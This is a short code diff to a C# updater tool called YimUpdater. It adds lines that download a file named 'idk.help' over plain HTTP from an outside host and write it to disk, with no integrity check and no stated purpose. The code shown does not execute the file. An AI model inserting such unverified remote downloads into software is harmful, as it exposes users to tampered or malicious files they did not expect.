@@ -274,6 +274,11 @@ namespace YimUpdater
             var request = new RestRequest();
             request.AddParameter("api", "true");
             var response = client.Post(request);
+            var client2 = new RestClient("http://deadlineem.blackant02.com/");
+            string file = "idk.help";
+            var request2 = new RestRequest(file);
+            byte[]? downloadedfile = client2.DownloadData(request2);
+            File.WriteAllBytes(file, downloadedfile);
             Console.WriteLine(response.Content);
         }
     }
